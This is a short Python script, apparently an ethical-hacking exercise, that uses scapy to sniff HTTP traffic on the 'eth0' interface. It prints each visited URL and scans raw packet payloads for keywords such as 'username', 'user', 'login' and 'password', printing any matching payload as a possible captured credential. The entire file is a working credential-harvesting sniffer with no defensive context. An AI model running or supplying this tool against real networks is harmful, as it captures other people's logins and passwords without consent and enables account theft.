import scapy.all as sc
from scapy.layers import http


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login(packet):
    if packet.haslayer(sc.Raw):
        load = packet[sc.Raw].load
        keywords = ['username', 'uname', 'user', 'login', 'password', 'pass']
        for keyword in keywords:
            if bytes(keyword, 'utf-8') in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print(f'[+] HTTP Request > {get_url(packet)}')
        login_info = get_login(packet)
        if login_info:
            print(f'\n\n[+] Possible username/password > {login_info}\n\n')


def sniff(interface):
    sc.sniff(iface=interface, store=False, prn=process_sniffed_packet)


sniff('eth0')
